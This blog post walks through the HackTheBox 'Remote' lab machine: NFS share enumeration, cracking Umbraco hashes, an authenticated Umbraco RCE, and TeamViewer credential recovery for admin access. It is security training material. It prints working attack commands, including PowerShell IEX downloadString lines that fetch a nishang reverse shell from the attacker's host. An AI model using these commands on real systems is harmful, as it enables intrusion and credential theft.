---
layout: post
title: "HackTheBox - Remote"
author: "joona"
---
![](/images/remote/remote.jpg)
Easy Windows box, where the initial access is achieved with credentials found in a backup, and an authenticated RCE vulnerability in a content management system.<br/>
The vulnerability used to privesc to root was pretty recent at the time of the release of this box,
but I had already encountered the same one in a [TryHackMe](https://tryhackme.com) room before this one.<br/>
Regardless, this box was fun too!<br/>


## Nmap results

{% highlight plaintext %}
# Nmap 7.80 scan initiated Sat Apr 11 01:53:51 2020 as: nmap -p- -A -T4 -oA nmap/remote 10.10.10.180
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|_  SYST: Windows_NT
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  mountd        1-3 (RPC #100005)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=4/11%OT=21%CT=1%CU=30103%PV=Y%DS=2%DC=T%G=Y%TM=5E915BE
OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=108%II=I%TS=U)SEQ(SP=107%GC
OS:D=1%ISR=108%CI=I%TS=U)SEQ(SP=108%GCD=1%ISR=109%CI=I%II=I%TS=U)OPS(O1=M54
OS:DNW8NNS%O2=M54DNW8NNS%O3=M54DNW8%O4=M54DNW8NNS%O5=M54DNW8NNS%O6=M54DNNS)
OS:WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=
OS:FFFF%O=M54DNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%
OS:DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%
OS:O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%
OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=
OS:)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%
OS:UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)
{% endhighlight %}
<br/>

## RPC enumeration
Applications use Remote Procedure Call (RPC) protocol to request a service from a program
on a different computer on a network.

The rpcbind maps an RPC service to a port that it listens. The RPC services tell the
rpcbind the address at which it is listening when the service is launched.

Scanning the rpcbind on port 111 with nmap:<br/>
`nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.10.180`
{% highlight plaintext %}
PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-ls: Volume /site_backups
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID         GID         SIZE   TIME                 FILENAME
| rwx------   4294967294  4294967294  4096   2020-09-04T16:39:55  .
| ??????????  ?           ?           ?      ?                    ..
| rwx------   4294967294  4294967294  64     2020-02-20T17:16:39  App_Browsers
| rwx------   4294967294  4294967294  4096   2020-02-20T17:17:19  App_Data
| rwx------   4294967294  4294967294  4096   2020-02-20T17:16:40  App_Plugins
| rwx------   4294967294  4294967294  8192   2020-02-20T17:16:42  Config
| rwx------   4294967294  4294967294  64     2020-02-20T17:16:40  aspnet_client
| rwx------   4294967294  4294967294  49152  2020-02-20T17:16:42  bin
| rwx------   4294967294  4294967294  64     2020-02-20T17:16:42  css
| rwx------   4294967294  4294967294  152    2018-11-01T17:06:44  default.aspx
|_
| nfs-showmount:
|_  /site_backups
| nfs-statfs:
|   Filesystem     1K-blocks   Used        Available   Use%  Maxfilesize  Maxlink
|_  /site_backups  31119356.0  12296020.0  18823336.0  40%   16.0T        1023
{% endhighlight %}

<br/>
We find a share called `/site_backups`.<br/>
Mounting the share:<br/>
{% highlight plaintext %}
sudo mkdir /mnt/remoteNFS
sudo mount 10.10.10.180:/site_backups /mnt/remoteNFS
{% endhighlight %}

Contents of /site_backups:<br/>
{% highlight plaintext %}
root@world:/mnt/remoteNFS# ls -lah
total 123K
drwx------ 2 nobody 4294967294 4.0K Feb 23  2020 .
drwxr-xr-x 3 root   root       4.0K Sep  5 11:26 ..
drwx------ 2 nobody 4294967294   64 Feb 20  2020 App_Browsers
drwx------ 2 nobody 4294967294 4.0K Feb 20  2020 App_Data
drwx------ 2 nobody 4294967294 4.0K Feb 20  2020 App_Plugins
drwx------ 2 nobody 4294967294   64 Feb 20  2020 aspnet_client
drwx------ 2 nobody 4294967294  48K Feb 20  2020 bin
drwx------ 2 nobody 4294967294 8.0K Feb 20  2020 Config
drwx------ 2 nobody 4294967294   64 Feb 20  2020 css
-rwx------ 1 nobody 4294967294  152 Nov  1  2018 default.aspx
-rwx------ 1 nobody 4294967294   89 Nov  1  2018 Global.asax
drwx------ 2 nobody 4294967294 4.0K Feb 20  2020 Media
drwx------ 2 nobody 4294967294   64 Feb 20  2020 scripts
drwx------ 2 nobody 4294967294 8.0K Feb 20  2020 Umbraco
drwx------ 2 nobody 4294967294 4.0K Feb 20  2020 Umbraco_Client
drwx------ 2 nobody 4294967294 4.0K Feb 20  2020 Views
-rwx------ 1 nobody 4294967294  28K Feb 20  2020 Web.config
{% endhighlight %}

The interesting part here is the Umbraco-folders. Umbraco is an open source
content management system (CMS). So we now know the CMS the website is using.

Digging through the files we can find the version number from `Web.config`:<br/>
{% highlight plaintext %}
root@world:/mnt/remoteNFS# cat Web.config | grep umbracoConfigurationStatus
		<add key="umbracoConfigurationStatus" value="7.12.4" />
{% endhighlight %}
I found the specific key from the [Umbraco forums](https://our.umbraco.com/forum/getting-started/installing-umbraco/15892-How-to-tell-which-version-of-Umbraco-an-installation-uses).

<br/>
After doing some more Googling, there is supposed to be a `Umbraco.sdf`-database file which holds credentials.<br/>
Quick search on the share, `find . -name *.sdf` finds **/mnt/remoteNFS/App_Data/Umbraco.sdf**.<br/>
I tried opening this with `LINQPad` and `SQL Compact Query Analyzer`, but both said the file was corrupted.

Reading the database file just with `strings` we get something interesting:<br/>
![](/images/remote/sdf_file.jpg)


I sorted this to a more readable format:<br/>
{% highlight plaintext %}
Administrator admin 	b8be16afba*censored*1b90e2aaa {"hashAlgorithm":"SHA1"}
admin admin@htb.local 	b8be16afba*censored*1b90e2aaa {"hashAlgorithm":"SHA1"}
smith smith@htb.local	jxDUCcruzN8rSR*censored*29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts= {"hashAlgorithm":"HMACSHA256"}
ssmith smith@htb.local	jxDUCcruzN8rSR*censored*29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts= {"hashAlgorithm":"HMACSHA256"}
ssmith ssmith@htb.local	8+xXICbPe7m5NQ*censored*9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA= {"hashAlgorithm":"HMACSHA256"}
{% endhighlight %}

I used [md5decrypt.net](https://md5decrypt.net/en/Sha1/) to crack the admin SHA1.

<br/>
## Website enumeration
We are now supposed to have the Umbraco administrator password so let's dig into the website.
The default Umbraco login is located at [http://10.10.10.180/umbraco](http://10.10.10.180/umbraco).

![](/images/remote/umbraco.jpg)

<br/>
Using admin@htb.local and the decrypted SHA1 password we are now logged in:
![](/images/remote/umbraco2.jpg)

<br/>
## Initial access
The Umbraco version 7.12.4 is vulnerable to [(Authenticated) Remote Code Execution](https://github.com/noraj/Umbraco-RCE).<br/>
We can check if the exploit works by running `whoami`:
{% highlight plaintext %}
root@world:~/hackthebox/boxes/remote# python exploit.py -u admin@htb.local -p PASSWORDHERE -i 'http://10.10.10.180' -c powershell.exe -a '-NoProfile -Command whoami'
iis apppool\defaultapppool
{% endhighlight %}

We get a response that the Umbraco service is running as `iis apppool\defaultappool`.

We can now create a reverse shell with [nishang](https://github.com/samratashok/nishang).<br/>
First we need to do some modifications to the reverse shell.<br/>

Copy the reverse shell to the current working directory:<br/>
`cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 nish.ps1`<br/>

Edit the nish.ps1 to have the following on the bottom of the file to automatically run the reverse shell:<br/>
`Invoke-PowerShellTcp -Reverse -IPAddress your_ip -Port 1336`<br/>

Setup an HTTP server on the directory that has the nish.ps1-file:<br/>
`python3 -m http.server`<br/>

Setup a listener to port 1336:<br/>
`nc -lvnp 1336`<br/>

<br/>
Now we are ready to actually run the reverse shell:<br/>
{% highlight plaintext %}
python exploit.py -u admin@htb.local -p PASSWORDHERE -i 'http://10.10.10.180' -c powershell.exe -a "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8000/nish.ps1')"
{% endhighlight %}

<br/>
We now have a shell on our listener and we can print the **C:\Users\Public\user.txt** flag.

<br/>
## Privilege escalation
I used [JAWS](https://github.com/411Hall/JAWS) to enumerate the machine:<br/>
`IEX(New-Object Net.WebClient).downloadString('http://10.10.14.14:8000/jaws-enum.ps1')`

This takes a while, so don't start throwing a tantrum if nothing seems to be happening.

<br/>
In the process listing that JAWS gives, there's `TeamViewer_Service.exe`. Supposing the machine name
is a hint of sorts, I started looking into this some more.<br/>

TeamViewer is installed in directory `C:\Program Files (x86)\TeamViewer\Version7` so now we have the version number.<br/>

This version stores user passwords encrypted with AES, but unhashed, in the registry accessible by low privilege users ([CVE-2019-18988](https://nvd.nist.gov/vuln/detail/CVE-2019-18988)).<br/>

There is a good [blog post by WhyNotSecurity](https://whynotsecurity.com/blog/teamviewer/) that walks through the exploit and gives us a python script to decrypt the AES.<br/>

<br/>
First we need to get the AES encrypted password from the registry:<br/>
`reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7 /v SecurityPasswordAES`
![](/images/remote/teamviewer_pass.jpg)

Get the python script from the WhyNotSecurity blog post mentioned above and add
the SecurityPasswordAES to be the value of `hex_str_cipher` variable.<br/>
Running the script we get the clear text password.
![](/images/remote/aes_pw.jpg)<br/>

<br/>
Using this password, we can now run `psexec.py` to get an Administrator shell.
{% highlight plaintext %}
/opt/impacket/examples/psexec.py 10.10.10.180/Administrator@10.10.10.180
{% endhighlight %}

![](/images/remote/rooted.jpg)
<br/>

Thank you for reading!
